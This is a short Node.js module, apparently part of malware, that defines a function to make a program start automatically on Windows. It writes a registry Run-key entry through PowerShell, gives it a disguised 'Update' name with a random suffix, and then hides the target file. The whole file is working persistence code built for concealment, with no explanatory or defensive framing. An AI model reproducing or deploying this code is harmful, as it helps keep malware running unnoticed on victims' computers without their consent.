const childprocess = require('child_process');
const core = require('./core');

function addRegistryPersistence(persistencePath, random) {
    childprocess.execSync(`powershell -Command "New-ItemProperty -Path \\"Registry::HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\" -Name \\"Update${random}\\" -Value \\"${persistencePath}\\""`);
    core.hideFile(persistencePath);
}
